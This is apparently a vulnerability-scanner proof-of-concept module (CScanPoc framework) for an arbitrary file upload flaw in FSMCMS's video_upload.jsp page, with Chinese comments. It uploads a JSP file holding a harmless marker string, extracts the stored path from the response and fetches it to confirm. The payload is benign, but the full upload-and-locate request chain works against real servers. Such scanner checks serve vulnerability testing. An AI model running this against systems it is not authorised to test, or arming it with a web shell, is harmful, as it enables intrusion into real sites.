# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'FSMCMS_0012'  # 平台漏洞编号，留空
    name = 'FSMCMS系统 任意文件上传'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = '2015-10-10'  # 漏洞公布时间
    desc = '''
        北京东方文辉FSMCMS /cms/video/video_upload.jsp 页面未做过滤，可任意文件上传。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0144300'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'FSMCMS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '59e42624-b23c-4fe0-9afb-03eb9a02ca29'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # Refer http://www.wooyun.org/bugs/wooyun-2015-0144300
            hh = hackhttp.hackhttp()
            arg = self.target
            raw = '''
POST /cms/video/video_upload.jsp HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: Keep-Alive
Content-Type: multipart/form-data; boundary=---------------------------26574492824214
Content-Length: 331

-----------------------------26574492824214
Content-Disposition: form-data; name="file"; filename="bugscan.jsp"
Content-Type: application/octet-stream

testvul_upload_file_test
-----------------------------26574492824214
Content-Disposition: form-data; name="upload"

upload
-----------------------------26574492824214--
            '''
            url = arg + '/cms/video/video_upload.jsp'
            code1, head1, res1, errcode1, _url1 = hh.http(url, raw=raw)
            if not re.findall('opener.document.all.VideoUrl.value=\'(.*?).flv\'', res1):
                pass
            else:
                shell_path = re.findall(
                    'opener.document.all.VideoUrl.value=\'(.*?).flv\'', res1)[0] + '.jsp'
                code, head, res, errcode, _url = hh.http(arg+shell_path)
                if code == 200 and 'testvul_upload_file_test' in res:
                    # security_hole(arg+shell_path)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
